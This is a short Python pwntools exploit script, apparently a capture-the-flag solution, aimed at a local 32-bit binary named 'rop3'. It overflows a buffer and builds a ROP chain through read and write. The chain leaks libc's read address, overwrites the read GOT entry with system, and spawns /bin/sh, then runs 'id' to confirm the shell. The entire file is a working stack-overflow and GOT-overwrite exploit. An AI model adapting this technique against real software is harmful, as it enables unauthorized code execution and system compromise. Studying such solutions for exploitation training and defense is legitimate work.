from pwn import *
from time import *

p = process("./rop3")
e = ELF("./rop3")

read_plt,read_got,write_plt,write_got = e.plt['read'],e.got['read'],e.plt['write'],e.got['write']

bin_sh = "/bin/sh"
pppr = 0x0804855d
offset = 0x9d0b0

payload = "A"*140

payload += p32(read_plt)
payload += p32(pppr)
payload += p32(0)
payload += p32(e.bss())
payload += p32(len(bin_sh))

payload += p32(write_plt)
payload += p32(pppr)
payload += p32(1)
payload += p32(read_got)
payload += p32(4)

payload += p32(read_plt)
payload += p32(pppr)
payload += p32(0)
payload += p32(read_got)
payload += p32(4)

payload += p32(read_plt)
payload += "AAAA"
payload += p32(e.bss())

p.send(payload)
p.send(bin_sh)
sleep(0.1)

system = u32(p.recv(4)) - offset
print hex(system)

p.sendline(p32(system))

p.sendline("id")
print p.recv()
